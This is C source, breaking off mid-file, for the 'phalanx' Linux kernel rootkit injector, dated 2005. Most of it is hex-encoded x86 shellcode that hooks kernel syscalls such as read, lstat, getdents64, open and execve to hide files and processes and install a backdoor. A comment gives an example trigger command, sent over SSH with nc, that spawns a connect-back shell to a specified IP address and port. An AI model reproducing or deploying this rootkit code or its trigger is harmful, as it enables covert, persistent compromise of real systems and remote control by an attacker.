/*
* phalanx kernel rootkit injector
* 
* %rebel% oct 2005
* rebel@pulltheplug.org
*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <malloc.h>
#include <sys/mman.h>
#include <sys/utsname.h>
#include <signal.h>
#include "conf.h"

#define GFP_KERNEL 0xd0
#define KERNEL_START 0xc0000000

#define EXECVE "\x8B\x5C\x24\x04\x43\x80\x3B\x00\x75\xFA\x81\x7B\xFC\x6E\x61\x6D\x65\x75\x10\x81\x7B\xF8\x68\x6F\x73\x74\x75\x07\xC7\x43\xFC\x2E\x70\x68\x31\xBB\x41\x41\x41\x41\xFF\xE3"
#define EXECVE_EADR 36

#define TCP "\x81\x7C\x24\x08\x01\x00\x00\x00\x74\x66\x8B\x54\x24\x08\x81\xFA\x00\x00\x00\xC0\x72\x27\x81\xFA\xFF\xFF\xFF\xEF\x77\x1F\x8B\x92\xF4\x00\x00\x00\x81\xFA\x00\x00\x00\xC0\x72\x11\x81\xFA\xFF\xFF\xFF\xEF\x77\x09\x81\x7A\x58\xE9\xA2\x00\x00\x74\x3F\x8B\x54\x24\x08\x81\xFA\x00\x00\x00\xC0\x72\x27\x81\xFA\xFF\xFF\xFF\xEF\x77\x1F\x8B\x92\x00\x01\x00\x00\x81\xFA\x00\x00\x00\xC0\x72\x11\x81\xFA\xFF\xFF\xFF\xEF\x77\x09\x81\x7A\x50\xE9\xA2\x00\x00\x74\x0C\xC7\x44\x24\xFC\x41\x41\x41\x41\xFF\x64\x24\xFC\xB8\x00\x00\x00\x00\xC3"
#define TCP_TADR 116

#define TOUCH "\x81\xEC\x48\x00\x00\x00\x8D\x4C\x24\x18\x89\x0C\x24\x8D\x4C\x24\x30\x89\x4C\x24\x04\x8D\x4C\x24\x28\x89\x4C\x24\x08\xC7\x44\x24\x0C\x00\x00\x00\x00\xC7\x44\x24\x10\x00\x00\x00\x00\xC7\x44\x24\x14\x00\x00\x00\x00\xC7\x44\x24\x18\x2F\x75\x73\x72\xC7\x44\x24\x1C\x2F\x62\x69\x6E\xC7\x44\x24\x20\x2F\x74\x6F\x75\xC7\x44\x24\x24\x63\x68\x00\x00\x8D\x4C\x24\x2C\x89\x4C\x24\x28\xC7\x44\x24\x2C\x00\x00\x00\x00\x8D\x4C\x24\x40\x89\x4C\x24\x30\x8D\x4C\x24\x40\x89\x4C\x24\x34\x8D\x4C\x24\x3C\x89\x4C\x24\x38\xC7\x44\x24\x3C\x00\x00\x00\x00\xC7\x44\x24\x40\x2F\x75\x4E\x46\xC7\x44\x24\x44\x75\x4E\x46\x00\xBF\x41\x41\x41\x41\x8D\x44\x24\x18\x8D\x54\x24\x30\x8D\x4C\x24\x28\xFF\xD7\x81\xC4\x48\x00\x00\x00\xC3\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
#define TOUCH_REGPARM "\x81\xEC\x48\x00\x00\x00\xC7\x04\x24\x00\x00\x00\x00\xC7\x44\x24\x04\x00\x00\x00\x00\xC7\x44\x24\x08\x00\x00\x00\x00\x8D\x4C\x24\x18\x89\x4C\x24\x0C\x8D\x4C\x24\x30\x89\x4C\x24\x10\x8D\x4C\x24\x28\x89\x4C\x24\x14\xC7\x44\x24\x18\x2F\x75\x73\x72\xC7\x44\x24\x1C\x2F\x62\x69\x6E\xC7\x44\x24\x20\x2F\x74\x6F\x75\xC7\x44\x24\x24\x63\x68\x00\x00\x8D\x4C\x24\x2C\x89\x4C\x24\x28\xC7\x44\x24\x2C\x00\x00\x00\x00\x8D\x4C\x24\x40\x89\x4C\x24\x30\x8D\x4C\x24\x40\x89\x4C\x24\x34\x8D\x4C\x24\x3C\x89\x4C\x24\x38\xC7\x44\x24\x3C\x00\x00\x00\x00\xC7\x44\x24\x40\x2F\x75\x4E\x46\xC7\x44\x24\x44\x75\x4E\x46\x00\xBF\x41\x41\x41\x41\x8D\x44\x24\x18\x8D\x54\x24\x30\x8D\x4C\x24\x28\xFF\xD7\x81\xC4\x48\x00\x00\x00\xC3\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

//example trigger:
//(echo SSH-2.0-OpenSSH_3.8.1p1;sleep 1;echo 'phalanx1!128.183.21.23!37771+++';cat)|nc phalanx 22
//^^ spawns a connectback to 128.183.21.23 on port 37771
#define READ "\xE9\x6D\x01\x00\x00\x8B\x3C\x24\x81\xC4\x04\x00\x00\x00\x8B\x0C\x24\x89\x0F\x81\xC4\x04\x00\x00\x00\xBF\x10\x10\x10\x10\xFF\xD7\x81\xEC\x04\x00\x00\x00\x89\x04\x24\xBA\x61\x61\x61\x61\xFF\xD2\x89\xC3\x8B\x04\x24\x81\xC4\x04\x00\x00\x00\x81\xFB\xE9\xA2\x00\x00\x74\x05\xE9\x05\x00\x00\x00\xE9\x14\x01\x00\x00\x81\x3C\x24\x01\x00\x00\x00\x75\x0E\x81\x3C\x24\x02\x00\x00\x00\x75\x05\xE9\xFD\x00\x00\x00\x81\xEC\x04\x00\x00\x00\x89\x04\x24\xBA\x71\x71\x71\x71\xFF\xD2\x89\xC6\x8B\x04\x24\x81\xC4\x04\x00\x00\x00\x8B\x1C\x24\x81\xEC\x80\x00\x00\x00\x89\x1C\x24\xC7\x44\x24\x04\x01\x54\x00\x00\x89\x44\x24\x10\x8D\x44\x24\x14\x8B\x9C\x24\x84\x00\x00\x00\x81\xEB\x00\x00\x00\x00\x89\x5C\x24\x08\x31\xC9\x31\xD2\x8A\x10\x8A\x33\x88\x13\x88\x30\x40\x43\x41\x81\xF9\x3D\x00\x00\x00\x75\xED\xBA\x41\x41\x41\x41\xFF\xD2\x89\x44\x24\x0C\x8D\x44\x24\x14\x8B\x9C\x24\x84\x00\x00\x00\x81\xEB\x00\x00\x00\x00\x31\xC9\x31\xD2\x8A\x10\x8A\x33\x88\x13\x88\x30\x40\x43\x41\x81\xF9\x3D\x00\x00\x00\x75\xED\x8B\x5C\x24\x0C\x8B\x44\x24\x10\x81\xC4\x80\x00\x00\x00\x81\xFB\x00\x00\x00\x00\x74\x49\x3D\x20\x00\x00\x00\x75\x4E\x8B\x4C\x24\x04\x8B\x09\x81\xF9\x70\x68\x61\x6C\x75\x40\x8B\x4C\x24\x04\x8B\x49\x04\x81\xF9\x61\x6E\x78\x31\x75\x31\x8B\x4C\x24\x04\x8A\x49\x08\x80\xF9\x21\x75\x25\x8B\x4C\x24\x04\xC6\x41\x1F\x00\xC6\x01\x50\xB8\x00\x00\x00\x00\x8B\x5C\x24\x04\xE9\x2B\x00\x00\x00\x8B\x1C\x24\x8B\x7C\x24\x04\xE9\xC6\x00\x00\x00\xE9\x15\x00\x00\x00\x8B\x3C\x24\x8D\x4F\xF7\x8B\x09\x89\x0C\x24\xC3\xE8\x8E\xFE\xFF\xFF\x41\x41\x41\x41\xE8\xE6\xFF\xFF\xFF\x81\xEC\x38\x00\x00\x00\x8D\x4C\x24\x14\x89\x0C\x24\x8D\x4C\x24\x34\x89\x4C\x24\x04\x8D\x4C\x24\x2C\x89\x4C\x24\x08\xC7\x44\x24\x0C\x00\x00\x00\x00\xC7\x44\x24\x10\x01\x00\x00\x00\xC7\x44\x24\x14\x2F\x75\x73\x72\xC7\x44\x24\x18\x2F\x73\x68\x61\xC7\x44\x24\x1C\x72\x65\x2F\x2E\xC7\x44\x24\x20\x68\x6F\x6D\x65\xC7\x44\x24\x24\x2E\x70\x68\x31\xC7\x44\x24\x28\x2F\x63\x62\x00\x8D\x4C\x24\x30\x89\x4C\x24\x2C\xC7\x44\x24\x30\x00\x00\x00\x00\x89\x5C\x24\x34\x8D\x4C\x24\x3C\x89\x4C\x24\x38\xC7\x44\x24\x3C\x00\x00\x00\x00\xBF\x55\x55\x55\x55\x8B\x04\x24\x8B\x54\x24\x04\x8B\x4C\x24\x08\xFF\xD7\x90\xB9\x41\x41\x41\x41\xBB\x00\x00\x00\x00\xC7\x04\x24\x00\x00\x00\x00\xFF\xE1\xBB\x00\xE0\xFF\xFF\x21\xE3\x8B\x1B\x81\xFB\x00\x00\x00\xC0\x72\x3E\x89\xD9\x8B\x93\xA4\x00\x00\x00\x8B\x92\x5C\x04\x00\x00\x81\xFA\x00\x00\x00\xC0\x72\x28\x8B\x92\x84\x00\x00\x00\x81\xFA\x00\x00\x00\x00\x74\x06\x8B\x89\xA4\x00\x00\x00\x8B\xB1\x98\x00\x00\x00\x81\xFE\xF4\x01\x00\x00\x77\x06\x8B\xB1\x9C\x00\x00\x00\x81\xEC\x40\x00\x00\x00\x89\x44\x24\x34\x89\x7C\x24\x38\x89\x5C\x24\x3C\x89\x3C\x24\xC7\x44\x24\x04\x42\x04\x00\x00\xC7\x44\x24\x08\xC0\x01\x00\x00\xC7\x44\x24\x0C\x2F\x75\x73\x72\xC7\x44\x24\x10\x2F\x73\x68\x61\xC7\x44\x24\x14\x72\x65\x2F\x2E\xC7\x44\x24\x18\x68\x6F\x6D\x65\xC7\x44\x24\x1C\x2E\x70\x68\x31\xC7\x44\x24\x20\x2F\x74\x74\x79\xC6\x44\x24\x24\x2F\xC6\x44\x24\x25\x30\xC6\x44\x24\x26\x30\xC6\x44\x24\x27\x30\xC6\x44\x24\x28\x30\xC7\x44\x24\x29\x00\x00\x00\x00\x81\xEC\x80\x00\x00\x00\x89\x04\x24\x89\x5C\x24\x04\x89\x4C\x24\x08\x89\x54\x24\x0C\x89\x7C\x24\x10\x89\x74\x24\x14\x89\x6C\x24\x18\x31\xDB\x31\xF6\xB9\x0A\x00\x00\x00\x89\xE5\x31\xFF\x8D\xAC\x24\xA9\x00\x00\x00\x8B\x44\x24\x14\x31\xD2\xF7\xF1\x25\xFF\xFF\x00\x00\x81\xE2\xFF\xFF\x00\x00\x66\x89\xD0\x66\x29\xD8\x66\x89\xD3\x66\x89\xC7\x89\xC8\x66\xBE\x0A\x00\x31\xD2\xF7\xF6\x25\xFF\xFF\x00\x00\x81\xE2\xFF\xFF\x00\x00\x89\xC6\x0F\xB7\xC7\x31\xD2\xF7\xF6\x81\xE2\xFF\xFF\x00\x00\x25\xFF\xFF\x00\x00\x66\x05\x30\x00\x88\x45\x00\x4D\x8B\x44\x24\x14\x31\xD2\xF7\xF1\x69\xC9\x0A\x00\x00\x00\x80\x7D\x00\x2F\x75\x9C\x8B\x04\x24\x8B\x5C\x24\x04\x8B\x4C\x24\x08\x8B\x54\x24\x0C\x8B\x7C\x24\x10\x8B\x74\x24\x14\x8B\x6C\x24\x18\x81\xC4\x80\x00\x00\x00\x31\xDB\x8D\x4C\x24\x0C\x8B\x54\x24\x38\x8A\x19\x8A\x3A\x88\x39\x88\x1A\x41\x42\x80\xFB\x00\x75\xF1\xBA\x41\x41\x41\x41\xFF\xD2\x31\xDB\x8D\x4C\x24\x0C\x8B\x54\x24\x38\x8A\x19\x8A\x3A\x88\x39\x88\x1A\x41\x42\x80\xFF\x00\x75\xF1\x8B\x54\x24\x38\x89\x44\x24\x38\x89\x04\x24\x89\x54\x24\x04\x8B\x54\x24\x34\x89\x54\x24\x08\xBA\x42\x42\x42\x42\xFF\xD2\x8B\x5C\x24\x38\xB8\x06\x00\x00\x00\xBA\x43\x43\x43\x43\xFF\xD2\x8B\x44\x24\x34\x81\xC4\x40\x00\x00\x00\xE9\x45\xFD\xFF\xFF\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
#define READ_REGPARM "\xE9\x6D\x01\x00\x00\x8B\x3C\x24\x81\xC4\x04\x00\x00\x00\x8B\x0C\x24\x89\x0F\x81\xC4\x04\x00\x00\x00\xBF\x10\x10\x10\x10\xFF\xD7\x81\xEC\x04\x00\x00\x00\x89\x04\x24\xBA\x61\x61\x61\x61\xFF\xD2\x89\xC3\x8B\x04\x24\x81\xC4\x04\x00\x00\x00\x81\xFB\xE9\xA2\x00\x00\x74\x05\xE9\x05\x00\x00\x00\xE9\x14\x01\x00\x00\x81\x3C\x24\x01\x00\x00\x00\x75\x0E\x81\x3C\x24\x02\x00\x00\x00\x75\x05\xE9\xFD\x00\x00\x00\x81\xEC\x04\x00\x00\x00\x89\x04\x24\xBA\x71\x71\x71\x71\xFF\xD2\x89\xC6\x8B\x04\x24\x81\xC4\x04\x00\x00\x00\x8B\x1C\x24\x81\xEC\x80\x00\x00\x00\x89\x1C\x24\xC7\x44\x24\x04\x01\x54\x00\x00\x89\x44\x24\x10\x8D\x44\x24\x14\x8B\x9C\x24\x84\x00\x00\x00\x81\xEB\x00\x00\x00\x00\x89\x5C\x24\x08\x31\xC9\x31\xD2\x8A\x10\x8A\x33\x88\x13\x88\x30\x40\x43\x41\x81\xF9\x3D\x00\x00\x00\x75\xED\xBA\x41\x41\x41\x41\xFF\xD2\x89\x44\x24\x0C\x8D\x44\x24\x14\x8B\x9C\x24\x84\x00\x00\x00\x81\xEB\x00\x00\x00\x00\x31\xC9\x31\xD2\x8A\x10\x8A\x33\x88\x13\x88\x30\x40\x43\x41\x81\xF9\x3D\x00\x00\x00\x75\xED\x8B\x5C\x24\x0C\x8B\x44\x24\x10\x81\xC4\x80\x00\x00\x00\x81\xFB\x00\x00\x00\x00\x74\x49\x3D\x20\x00\x00\x00\x75\x4E\x8B\x4C\x24\x04\x8B\x09\x81\xF9\x70\x68\x61\x6C\x75\x40\x8B\x4C\x24\x04\x8B\x49\x04\x81\xF9\x61\x6E\x78\x31\x75\x31\x8B\x4C\x24\x04\x8A\x49\x08\x80\xF9\x21\x75\x25\x8B\x4C\x24\x04\xC6\x41\x1F\x00\xC6\x01\x50\xB8\x00\x00\x00\x00\x8B\x5C\x24\x04\xE9\x2B\x00\x00\x00\x8B\x1C\x24\x8B\x7C\x24\x04\xE9\xC6\x00\x00\x00\xE9\x15\x00\x00\x00\x8B\x3C\x24\x8D\x4F\xF7\x8B\x09\x89\x0C\x24\xC3\xE8\x8E\xFE\xFF\xFF\x41\x41\x41\x41\xE8\xE6\xFF\xFF\xFF\x81\xEC\x38\x00\x00\x00\xC7\x04\x24\x00\x00\x00\x00\xC7\x44\x24\x04\x00\x00\x00\x00\x8D\x4C\x24\x14\x89\x4C\x24\x08\x8D\x4C\x24\x34\x89\x4C\x24\x0C\x8D\x4C\x24\x2C\x89\x4C\x24\x10\xC7\x44\x24\x14\x2F\x75\x73\x72\xC7\x44\x24\x18\x2F\x73\x68\x61\xC7\x44\x24\x1C\x72\x65\x2F\x2E\xC7\x44\x24\x20\x68\x6F\x6D\x65\xC7\x44\x24\x24\x2E\x70\x68\x31\xC7\x44\x24\x28\x2F\x63\x62\x00\x8D\x4C\x24\x30\x89\x4C\x24\x2C\xC7\x44\x24\x30\x00\x00\x00\x00\x89\x5C\x24\x34\x8D\x4C\x24\x3C\x89\x4C\x24\x38\xC7\x44\x24\x3C\x00\x00\x00\x00\xBF\x55\x55\x55\x55\x8D\x44\x24\x14\x8D\x54\x24\x34\x8D\x4C\x24\x2C\xFF\xD7\xB9\x41\x41\x41\x41\xBB\x00\x00\x00\x00\xC7\x04\x24\x00\x00\x00\x00\xFF\xE1\xBB\x00\xE0\xFF\xFF\x21\xE3\x8B\x1B\x81\xFB\x00\x00\x00\xC0\x72\x3E\x89\xD9\x8B\x93\xA4\x00\x00\x00\x8B\x92\x5C\x04\x00\x00\x81\xFA\x00\x00\x00\xC0\x72\x28\x8B\x92\x84\x00\x00\x00\x81\xFA\x00\x00\x00\x00\x74\x06\x8B\x89\xA4\x00\x00\x00\x8B\xB1\x98\x00\x00\x00\x81\xFE\xF4\x01\x00\x00\x77\x06\x8B\xB1\x9C\x00\x00\x00\x81\xEC\x40\x00\x00\x00\x89\x44\x24\x34\x89\x7C\x24\x38\x89\x5C\x24\x3C\x89\x3C\x24\xC7\x44\x24\x04\x42\x04\x00\x00\xC7\x44\x24\x08\xC0\x01\x00\x00\xC7\x44\x24\x0C\x2F\x75\x73\x72\xC7\x44\x24\x10\x2F\x73\x68\x61\xC7\x44\x24\x14\x72\x65\x2F\x2E\xC7\x44\x24\x18\x68\x6F\x6D\x65\xC7\x44\x24\x1C\x2E\x70\x68\x31\xC7\x44\x24\x20\x2F\x74\x74\x79\xC6\x44\x24\x24\x2F\xC6\x44\x24\x25\x30\xC6\x44\x24\x26\x30\xC6\x44\x24\x27\x30\xC6\x44\x24\x28\x30\xC7\x44\x24\x29\x00\x00\x00\x00\x81\xEC\x80\x00\x00\x00\x89\x04\x24\x89\x5C\x24\x04\x89\x4C\x24\x08\x89\x54\x24\x0C\x89\x7C\x24\x10\x89\x74\x24\x14\x89\x6C\x24\x18\x31\xDB\x31\xF6\xB9\x0A\x00\x00\x00\x89\xE5\x31\xFF\x8D\xAC\x24\xA9\x00\x00\x00\x8B\x44\x24\x14\x31\xD2\xF7\xF1\x25\xFF\xFF\x00\x00\x81\xE2\xFF\xFF\x00\x00\x66\x89\xD0\x66\x29\xD8\x66\x89\xD3\x66\x89\xC7\x89\xC8\x66\xBE\x0A\x00\x31\xD2\xF7\xF6\x25\xFF\xFF\x00\x00\x81\xE2\xFF\xFF\x00\x00\x89\xC6\x0F\xB7\xC7\x31\xD2\xF7\xF6\x81\xE2\xFF\xFF\x00\x00\x25\xFF\xFF\x00\x00\x66\x05\x30\x00\x88\x45\x00\x4D\x8B\x44\x24\x14\x31\xD2\xF7\xF1\x69\xC9\x0A\x00\x00\x00\x80\x7D\x00\x2F\x75\x9C\x8B\x04\x24\x8B\x5C\x24\x04\x8B\x4C\x24\x08\x8B\x54\x24\x0C\x8B\x7C\x24\x10\x8B\x74\x24\x14\x8B\x6C\x24\x18\x81\xC4\x80\x00\x00\x00\x31\xDB\x8D\x4C\x24\x0C\x8B\x54\x24\x38\x8A\x19\x8A\x3A\x88\x39\x88\x1A\x41\x42\x80\xFB\x00\x75\xF1\xBA\x41\x41\x41\x41\xFF\xD2\x31\xDB\x8D\x4C\x24\x0C\x8B\x54\x24\x38\x8A\x19\x8A\x3A\x88\x39\x88\x1A\x41\x42\x80\xFF\x00\x75\xF1\x8B\x54\x24\x38\x89\x44\x24\x38\x89\x04\x24\x89\x54\x24\x04\x8B\x54\x24\x34\x89\x54\x24\x08\xBA\x42\x42\x42\x42\xFF\xD2\x8B\x5C\x24\x38\xB8\x06\x00\x00\x00\xBA\x43\x43\x43\x43\xFF\xD2\x8B\x44\x24\x34\x81\xC4\x40\x00\x00\x00\xE9\x45\xFD\xFF\xFF\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
#define READ_RADR 26
#define READ_GIDADR 42
#define READ_PIDADR 110
#define READ_IADR 196
#define READ_CADR 514
#define READ_EADR 533
#define READ_OADR 960
#define READ_WADR 1015
#define READ_CLADR 1031


#define LSTAT "\x8B\x5C\x24\x04\x43\x80\x3B\x00\x75\xFA\x81\x7B\xFC\x6E\x61\x6D\x65\x75\x57\x81\x7B\xF8\x68\x6F\x73\x74\x75\x4E\xC7\x43\xFC\x2E\x70\x68\x31\xE9\x63\x01\x00\x00\x8B\x14\x24\x81\xC4\x04\x00\x00\x00\x8B\x0C\x24\x89\x0A\x81\xC4\x04\x00\x00\x00\xBA\x55\x55\x55\x55\xFF\xD2\x8B\x1C\x24\x43\x80\x3B\x00\x75\xFA\xC7\x43\xFC\x6E\x61\x6D\x65\xE8\x3C\x01\x00\x00\x8B\x14\x24\x81\xC4\x04\x00\x00\x00\x8D\x4A\xF7\x8B\x09\x89\x0C\x24\xC3\x81\xEC\x04\x00\x00\x00\x89\x04\x24\xBA\x61\x61\x61\x61\xFF\xD2\x89\xC2\x8B\x04\x24\x81\xC4\x04\x00\x00\x00\x81\xFA\xE9\xA2\x00\x00\x75\x05\xE9\xF1\x00\x00\x00\x8B\x7C\x24\x04\x8B\x74\x24\x04\x81\x3E\x2E\x70\x68\x31\x74\x08\x80\x3E\x00\x74\x09\x46\xEB\xF0\xB8\xFE\xFF\xFF\xFF\xC3\x80\x3F\x31\x72\x55\x80\x3F\x39\x77\x50\x80\x7F\x01\x30\x72\x4A\x80\x7F\x01\x39\x77\x44\x80\x7F\x02\x30\x72\x3E\x80\x7F\x02\x39\x77\x38\x8D\x5F\xFF\x31\xD2\x42\x31\xF6\x80\x7F\x01\x30\x72\x09\x80\x7F\x01\x39\x77\x03\x47\xEB\xF1\x31\xC9\x39\xFB\x74\x23\x8A\x0F\x81\xE9\x30\x00\x00\x00\x0F\xAF\xCA\x01\xCE\x69\xD2\x0A\x00\x00\x00\x4F\xEB\xE4\xE9\x79\x00\x00\x00\x80\x3F\x00\x74\xF6\x47\xEB\x9E\x81\xEC\x10\x00\x00\x00\xC7\x04\x24\x02\x00\x00\x00\x89\x74\x24\x04\x89\x44\x24\x08\x89\x7C\x24\x0C\xBF\x41\x41\x41\x41\xB8\x02\x00\x00\x00\x89\xF2\xFF\xD7\x89\xC2\x8B\x44\x24\x08\x8B\x7C\x24\x0C\x81\xC4\x10\x00\x00\x00\x89\xD1\x81\xE1\x00\x00\x00\xF0\xC1\xE9\x1C\x80\xF9\x0C\x75\x2A\x81\xFA\x00\x00\x00\x00\x74\x22\x8D\x8A\x58\x02\x00\x00\x8D\x92\x80\x00\x00\x00\x81\x3A\xE9\xA2\x00\x00\x0F\x84\x31\xFF\xFF\xFF\x81\xC2\x04\x00\x00\x00\x39\xCA\x72\xEA\xBE\x55\x55\x55\x55\xFF\xE6\xC3\xE8\x98\xFE\xFF\xFF\x4E\x4E\x4E\x4E\xE8\xBF\xFE\xFF\xFF"
#define LSTAT_LADR2 61
#define LSTAT_GIDADR 116
#define LSTAT_FADR 300
#define LSTAT_LADR 388

//newer versions of 2.6 has find_task_by_pid_type which has a different syntax
//than find_task_by_pid
#define GETDENTS64 "\xE9\x4E\x02\x00\x00\x8B\x3C\x24\x81\xC4\x04\x00\x00\x00\x8B\x0C\x24\x89\x0F\x81\xC4\x04\x00\x00\x00\xBF\x41\x41\x41\x41\xFF\xD7\x81\xEC\x04\x00\x00\x00\x89\x04\x24\xBA\x61\x61\x61\x61\xFF\xD2\x89\xC2\x8B\x04\x24\x81\xC4\x04\x00\x00\x00\x81\xFA\xE9\xA2\x00\x00\x75\x05\xE9\xFA\x01\x00\x00\x89\xC2\x8B\x4C\x24\x04\x89\xCE\x89\xF0\x31\xDB\x66\x8B\x58\x10\x81\xEC\x08\x00\x00\x00\x89\x0C\x24\xC7\x44\x24\x04\x00\x00\x00\x00\x8D\x48\x13\x80\x39\x31\x0F\x8C\x2D\x01\x00\x00\x80\x39\x39\x0F\x8F\x24\x01\x00\x00\x80\x79\x01\x30\x0F\x8C\x1A\x01\x00\x00\x80\x79\x01\x39\x0F\x8F\x10\x01\x00\x00\x80\x79\x02\x30\x0F\x8C\x06\x01\x00\x00\x80\x79\x02\x39\x0F\x8F\xFC\x00\x00\x00\x81\xEC\x18\x00\x00\x00\x89\x04\x24\x89\x5C\x24\x04\x89\x4C\x24\x08\x89\x54\x24\x0C\x89\x74\x24\x10\x89\x7C\x24\x14\x89\xCF\x8D\x5F\xFF\xBA\x01\x00\x00\x00\x81\xEC\x04\x00\x00\x00\xC7\x04\x24\x00\x00\x00\x00\x80\x7F\x01\x00\x74\x03\x47\xEB\xF7\x31\xC9\x39\xFB\x74\x17\x8A\x0F\x81\xE9\x30\x00\x00\x00\x0F\xAF\xCA\x01\x0C\x24\x69\xD2\x0A\x00\x00\x00\x4F\xEB\xE3\x8B\x1C\x24\x81\xC4\x04\x00\x00\x00\x81\xFB\xB8\x88\x00\x00\x72\x05\xE9\x6A\x00\x00\x00\x81\xEC\x10\x00\x00\x00\x89\x1C\x24\xC7\x44\x24\x04\x02\x00\x00\x00\x89\x44\x24\x08\x89\x7C\x24\x0C\xBF\x80\x80\x80\x80\x89\xD8\xBB\x02\x00\x00\x00\xFF\xD7\x89\xC2\x8B\x44\x24\x08\x8B\x7C\x24\x0C\x81\xC4\x10\x00\x00\x00\x81\xFA\x00\x00\x00\x00\x74\x2B\x8D\x8A\x58\x02\x00\x00\x8D\x92\x80\x00\x00\x00\x81\x3A\xE9\xA2\x00\x00\x74\x0F\x81\xC2\x04\x00\x00\x00\x39\xCA\x72\xEE\xE9\x08\x00\x00\x00\xC7\x44\x24\x1C\x01\x00\x00\x00\x8B\x04\x24\x8B\x5C\x24\x04\x8B\x4C\x24\x08\x8B\x54\x24\x0C\x8B\x74\x24\x10\x8B\x7C\x24\x14\x81\xC4\x18\x00\x00\x00\xE9\x16\x00\x00\x00\x41\x80\x39\x00\x74\x10\x81\x39\x2E\x70\x68\x31\x75\xF2\xC7\x44\x24\x04\x01\x00\x00\x00\x8B\x0C\x24\x81\xC4\x08\x00\x00\x00\x81\x7C\x24\xFC\x01\x00\x00\x00\x74\x16\x01\xD8\x89\xC3\x29\xF3\x39\xD3\x7D\x05\xE9\x78\xFE\xFF\xFF\x89\xD0\xE9\x61\x00\x00\x00\x31\xC9\x66\x89\xD9\x89\xC7\x29\xF7\x89\xD1\x29\xF9\x81\xEC\x10\x00\x00\x00\x89\x0C\x24\x89\x54\x24\x04\x89\x5C\x24\x08\x31\xC9\xC7\x44\x24\x0C\x00\x00\x00\x00\x31\xFF\x89\xC7\x03\x7C\x24\x0C\x8A\x4F\x01\x88\x0F\xFF\x44\x24\x0C\x8B\x7C\x24\x0C\x3B\x3C\x24\x72\xE6\xFF\x4C\x24\x08\x81\x7C\x24\x08\x00\x00\x00\x00\x75\xCE\x8B\x0C\x24\x8B\x54\x24\x04\x81\xC4\x10\x00\x00\x00\x29\xDA\xEB\x89\xE9\x15\x00\x00\x00\x8B\x3C\x24\x8D\x4F\xF7\x8B\x09\x89\x0C\x24\xC3\xE8\xAD\xFD\xFF\xFF\x41\x41\x41\x41\xE8\xE6\xFF\xFF\xFF\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
#define GETDENTS64_TYPE "\xE9\x15\x01\x00\x00\x8B\x3C\x24\x81\xC4\x04\x00\x00\x00\x8B\x0C\x24\x89\x0F\x81\xC4\x04\x00\x00\x00\xBF\x41\x41\x41\x41\xFF\xD7\x81\xEC\x04\x00\x00\x00\x89\x04\x24\xBA\x61\x61\x61\x61\xFF\xD2\x89\xC2\x8B\x04\x24\x81\xC4\x04\x00\x00\x00\x81\xFA\xE9\xA2\x00\x00\x75\x05\xE9\xC1\x00\x00\x00\x89\xC2\x8B\x4C\x24\x04\x89\xCE\x89\xF0\x31\xDB\x66\x8B\x58\x10\x81\xEC\x08\x00\x00\x00\x89\x0C\x24\xC7\x44\x24\x04\x00\x00\x00\x00\x8D\x48\x13\x41\x80\x39\x00\x74\x10\x81\x39\x2E\x70\x68\x31\x75\xF2\xC7\x44\x24\x04\x01\x00\x00\x00\x8B\x0C\x24\x81\xC4\x08\x00\x00\x00\x81\x7C\x24\xFC\x01\x00\x00\x00\x74\x13\x01\xD8\x89\xC3\x29\xF3\x39\xD3\x7D\x02\xEB\xB1\x89\xD0\xE9\x61\x00\x00\x00\x31\xC9\x66\x89\xD9\x89\xC7\x29\xF7\x89\xD1\x29\xF9\x81\xEC\x10\x00\x00\x00\x89\x0C\x24\x89\x54\x24\x04\x89\x5C\x24\x08\x31\xC9\xC7\x44\x24\x0C\x00\x00\x00\x00\x31\xFF\x89\xC7\x03\x7C\x24\x0C\x8A\x4F\x01\x88\x0F\xFF\x44\x24\x0C\x8B\x7C\x24\x0C\x3B\x3C\x24\x72\xE6\xFF\x4C\x24\x08\x81\x7C\x24\x08\x00\x00\x00\x00\x75\xCE\x8B\x0C\x24\x8B\x54\x24\x04\x81\xC4\x10\x00\x00\x00\x29\xDA\xEB\x8C\xE9\x15\x00\x00\x00\x8B\x3C\x24\x8D\x4F\xF7\x8B\x09\x89\x0C\x24\xC3\xE8\xE6\xFE\xFF\xFF\x41\x41\x41\x41\xE8\xE6\xFF\xFF\xFF\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
#define GETDENTS64_GADR 26
#define GETDENTS64_GIDADR 42
#define GETDENTS64_FADR 304

#define OPEN_TYPE "\x8B\x5C\x24\x04\x43\x80\x3B\x00\x75\xFA\x81\x7B\xFC\x6E\x61\x6D\x65\x75\x15\x81\x7B\xF8\x68\x6F\x73\x74\x75\x0C\xC7\x43\xFC\x2E\x70\x68\x31\xE9\x0A\x01\x00\x00\x81\xEC\x04\x00\x00\x00\x89\x04\x24\xBA\x61\x61\x61\x61\xFF\xD2\x89\xC2\x8B\x04\x24\x81\xC4\x04\x00\x00\x00\x81\xFA\xE9\xA2\x00\x00\x75\x05\xE9\xE2\x00\x00\x00\x8B\x7C\x24\x04\xE9\x06\x00\x00\x00\xB8\xFE\xFF\xFF\xFF\xC3\x80\x3F\x31\x72\x55\x80\x3F\x39\x77\x50\x80\x7F\x01\x30\x72\x4A\x80\x7F\x01\x39\x77\x44\x80\x7F\x02\x30\x72\x3E\x80\x7F\x02\x39\x77\x38\x8D\x5F\xFF\x31\xD2\x42\x31\xF6\x80\x7F\x01\x30\x72\x09\x80\x7F\x01\x39\x77\x03\x47\xEB\xF1\x31\xC9\x39\xFB\x74\x23\x8A\x0F\x81\xE9\x30\x00\x00\x00\x0F\xAF\xCA\x01\xCE\x69\xD2\x0A\x00\x00\x00\x4F\xEB\xE4\xE9\x79\x00\x00\x00\x80\x3F\x00\x74\xF6\x47\xEB\x9E\x81\xEC\x10\x00\x00\x00\xC7\x04\x24\x02\x00\x00\x00\x89\x74\x24\x04\x89\x44\x24\x08\x89\x7C\x24\x0C\xBF\x41\x41\